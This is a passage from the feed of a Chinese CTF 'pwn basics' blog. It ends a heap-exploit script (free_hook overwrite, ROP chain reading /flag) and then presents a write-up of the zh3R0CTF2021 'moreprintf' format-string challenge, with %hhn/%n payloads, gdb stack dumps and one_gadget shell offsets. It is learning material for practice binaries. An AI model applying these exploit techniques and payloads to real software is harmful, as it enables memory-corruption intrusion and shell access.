class=&#34;number&#34;&gt;0x5d0&lt;/span&gt;) + p64(p_rdi_r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content_edit(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,pl)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ----------------------------------------------- 3 set gadget into free_hook&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name_edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(free_hook)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;8888&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,p64(gadget)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ---------------------------------------------- 4 在堆块中布置rop链&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0xb10&lt;/span&gt;) + p64(p_rsi_r) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(open_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 这里要注意选择open返回的fd指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(p_rdi_r) + p64(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + p64(p_rsi_r) + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;) + p64(p_rdx_r12_r) + p64(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(read_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(p_rdi_r) + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;) + p64(puts)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content_edit(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,pl)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name_edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;/flag\x00\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#command = &amp;#x27;b *&amp;#x27;+ str(hex(gadget))+&amp;#x27;\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#dbg(command)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ---------------------------------------------- 5 trigger&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# end&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;itr()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

</content>
        <category term="PWN入门" />
        <updated>2024-01-27T15:28:41.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/</id>
        <title>pwn入门-47-zh3R0CTF2021-moreprintf</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/"/>
        <content type="html">&lt;p&gt;这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关?&lt;/p&gt;
&lt;p&gt;​	先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇…&lt;/p&gt;
&lt;h1 id=&#34;格式化字符串漏洞基础&#34;&gt;&lt;a href=&#34;#格式化字符串漏洞基础&#34; class=&#34;headerlink&#34; title=&#34;格式化字符串漏洞基础&#34;&gt;&lt;/a&gt;格式化字符串漏洞基础&lt;/h1&gt;&lt;h2 id=&#34;n&#34;&gt;&lt;a href=&#34;#n&#34; class=&#34;headerlink&#34; title=&#34;%n&#34;&gt;&lt;/a&gt;%n&lt;/h2&gt;&lt;p&gt;​	为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址&lt;/p&gt;
&lt;p&gt;​	例如%100×10$n: 将100写入第十个位置所保存的指针指向的地址(4字节), %$hn是2字节,%$hhn是1字节,%$lln是8字节&lt;/p&gt;
&lt;h2 id=&#34;p&#34;&gt;&lt;a href=&#34;#p&#34; class=&#34;headerlink&#34; title=&#34;%p&#34;&gt;&lt;/a&gt;%p&lt;/h2&gt;&lt;p&gt;​	%p %p %p %p %p %p %p %p %p %p &lt;/p&gt;
&lt;p&gt;​	在b *fprintf+143也就是vprintf下断点,然后set $rdi&amp;#x3D;_IO_stdout, 单步,就可以打印地址了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;*RSI  &lt;span class=&#34;number&#34;&gt;0x55555555b4c0&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;0x55555555b260 0x7ffff7af2151 0x7ffff7dcf8c0 0x7ffff7ff5540 0x7fffffffe470 0xb1dad8e32f5ad200 0x5555555552c0 0x7ffff7a03bf7 0x1 0x7fffffffe568\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	前四个值和后四个值&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231112234114271.png&#34; alt=&#34;image-20231112234114271&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;c&#34;&gt;&lt;a href=&#34;#c&#34; class=&#34;headerlink&#34; title=&#34;%c&#34;&gt;&lt;/a&gt;%c&lt;/h2&gt;&lt;p&gt;​	c是一个字符的意思, 在后面的exp中,%c%c%c%5c%hhn表示,前三次输出,都是输出一个字符,第四次是5个字符,然后一共是8个字节了,把8写入第5个位置的指针指向的地址.&lt;/p&gt;
&lt;p&gt;​	set $rdi&amp;#x3D;_IO_stdout  ( 其他版本呢?)&lt;/p&gt;
&lt;p&gt;​	%caaa%cbbb%cccc%5cddd%hhn,&lt;/p&gt;
&lt;p&gt;​	可以看到确实只打印了第一个字符,然后%5c是把不足的用空格补齐&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`aaaQbbb�ccc    @ddd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-04-22.jpg&#34; alt=&#34;Snipaste_2023-11-08_20-04-22&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;​	然后把值写到了第5个位置的指针指向的地址&lt;/p&gt;
&lt;p&gt;​	用%c%c%c%5c%hhn试一下, 可以看到确实是改成了0x08&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-09-31.jpg&#34; alt=&#34;Snipaste_2023-11-08_20-09-31&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​	但在我这里应该是要改成0xc8 不过其实应该没影响,都是把read地方的值改成onegadget&lt;/p&gt;
&lt;h3 id=&#34;任意地址写修改值&#34;&gt;&lt;a href=&#34;#任意地址写修改值&#34; class=&#34;headerlink&#34; title=&#34;任意地址写修改值&#34;&gt;&lt;/a&gt;任意地址写修改值&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%c%c%c%&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;c%hhn%*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;$d%&lt;span class=&#34;number&#34;&gt;186326&lt;/span&gt;c%&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;$n&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	&lt;/p&gt;
&lt;p&gt;​	除了wp给的payload,换其他的很多都不行…为什么呢?? 仔细观察源码, &lt;strong&gt;有输入长度的限制的&lt;/strong&gt;,  fgets(buffer, 31, stdin); &lt;/p&gt;
&lt;p&gt;​	如果不是单纯做题而是研究一下打法的话,可以拓展一下长度试试,这样的话应该就好很多,(可以加系统调用限制,然后又是orw的一道题(x)) (或者直接在运行的时候改寄存器,修改读入长度)&lt;/p&gt;
&lt;h4 id=&#34;修改ret返回值-x&#34;&gt;&lt;a href=&#34;#修改ret返回值-x&#34; class=&#34;headerlink&#34; title=&#34;修改ret返回值(x)&#34;&gt;&lt;/a&gt;修改ret返回值(x)&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;d0│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4a0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x555555555100&lt;/span&gt; (_start) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1b&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;d8│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4a8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x5555555552af&lt;/span&gt; (main+&lt;span class=&#34;number&#34;&gt;198&lt;/span&gt;) ◂— mov edi, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;00e0&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4b0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7fffffffe4b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;00e8&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4b8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xb8204e953bb68d00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;0│ rbp &lt;span class=&#34;number&#34;&gt;0x7fffffffe4c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x5555555552c0&lt;/span&gt; (__libc_csu_init) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;8│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff7a03c87&lt;/span&gt; (__libc_start_main+&lt;span class=&#34;number&#34;&gt;231&lt;/span&gt;) ◂— mov edi, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%c%c%c%&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;c%hhn%*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;$d%????c%&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;$n&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;onegadget - (200 + 0x21c87 )就是要改的值了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x4f2a5&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rsp &amp;amp; &lt;span class=&#34;number&#34;&gt;0xf&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rcx == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x4f302&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x10a2fc&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;0x4f2a5- (200 + 0x21c87 ) &amp;#x3D; 185686&lt;/p&gt;
&lt;p&gt;%c%c%c%197c%hhn%*8$d%185686c%5$n&lt;/p&gt;
&lt;p&gt;邪门,就是不出c8,概率比较小,可能和系统有关?&lt;/p&gt;
&lt;p&gt;改成0x18吧…&lt;/p&gt;
&lt;p&gt;%c%c%c%21c%hhn%*8$d%185862c%5$n&lt;/p&gt;
&lt;p&gt;但还是不行..&lt;/p&gt;
&lt;p&gt;问题出在这个函数没有ret的….那….. 所以覆盖了也没用…&lt;/p&gt;
&lt;p&gt;fprintf之后有ret 回main函数的exit, 是不是可以修改这里呢? 这里就是下面的main+198&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231116172117205.png&#34; alt=&#34;image-20231116172117205&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;改其他的函数指针-比如改main-198&#34;&gt;&lt;a href=&#34;#改其他的函数指针-比如改main-198&#34; class=&#34;headerlink&#34; title=&#34;改其他的函数指针,比如改main+198&#34;&gt;&lt;/a&gt;改其他的函数指针,比如改main+198&lt;/h4&gt;&lt;p&gt;0x556fe88e42af这里会执行到的,但是是把这里的值改了(用watch下断点查看)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;d0│     &lt;span class=&#34;number&#34;&gt;0x7ffca5108380&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x556fe88e4100&lt;/span&gt; (_start) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1b&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;d8│     &lt;span class=&#34;number&#34;&gt;0x7ffca5108388&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x556fe88e42af&lt;/span&gt; (main+&lt;span class=&#34;number&#34;&gt;198&lt;/span&gt;) ◂— mov edi, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;00e0&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffca5108390&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7ffca5108390&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;00e8&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffca5108398&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x695c632b96376d00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;0│ rbp &lt;span class=&#34;number&#34;&gt;0x7ffca51083a0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x556fe88e42c0&lt;/span&gt; (__libc_csu_init) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;8│     &lt;span class=&#34;number&#34;&gt;0x7ffca51083a8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fc96c879c87&lt;/span&gt; (__libc_start_main+&lt;span class=&#34;number&#34;&gt;231&lt;/span&gt;) ◂— mov edi, eax&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;修改下内存测试下&lt;/p&gt;
&lt;p&gt;0x7f8d3724c000+0x4f2a5  &amp;#x3D; 0x7f8d3729b2a5&lt;/p&gt;
&lt;p&gt;set *0x7ffc28b196d8&amp;#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)&lt;/p&gt;
&lt;p&gt;set *0x7ffc28b196dc&amp;#x3D; 0x7f8d&lt;/p&gt;
&lt;p&gt;这里会把这个值修改一下,但不知道后面会不会执行, 会执行!!!&lt;/p&gt;
&lt;p&gt;0x18: %c%c%c%21c%hhn%*8$d%185862c%5$n&lt;/p&gt;
&lt;p&gt;0x28: %c%c%c%37c%hhn%*8$d%185846c%5$n&lt;/p&gt;
&lt;p&gt; 但是没办法一次改完….得两次啊,不对,应该用%lln&lt;/p&gt;
&lt;p&gt;0x18: %c%c%c%21c%hhn%*8$d%185862c%5$lln&lt;/p&gt;
&lt;p&gt;0x28: %c%c%c%37c%hhn%*8$d%185846c%5$lln&lt;/p&gt;
&lt;p&gt;不过为什么好像没有改成8字节,还是4字节呢?&lt;/p&gt;
&lt;p&gt;以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下&lt;/p&gt;
&lt;h2 id=&#34;如何确定能到read&#34;&gt;&lt;a href=&#34;#如何确定能到read&#34; class=&#34;headerlink&#34; title=&#34;如何确定能到read&#34;&gt;&lt;/a&gt;如何确定能到read&lt;/h2&gt;&lt;p&gt;​	那就算修改了read, 怎么确定一定会执行到read呢, 不是执行到read,而是执行到栈里的这个地方,把那里的值改了,看wp一头雾水,wp中的调用链在本地测试不是这样&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;所以我感觉有几份就是瞎扯淡,瞎蒙的(不过也可能是自己认识不足&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231108230705755.png&#34; alt=&#34;image-20231108230705755&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	是在vprift里面触发的&lt;/p&gt;
&lt;p&gt;​	哦卧槽,这和栈的结构有关….?? 为什么返回地址会到这呢??&lt;/p&gt;
&lt;p&gt;​	改rsp上面那个值才行&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;00e0&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd959070f0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffd95907008&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7f2523745be7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 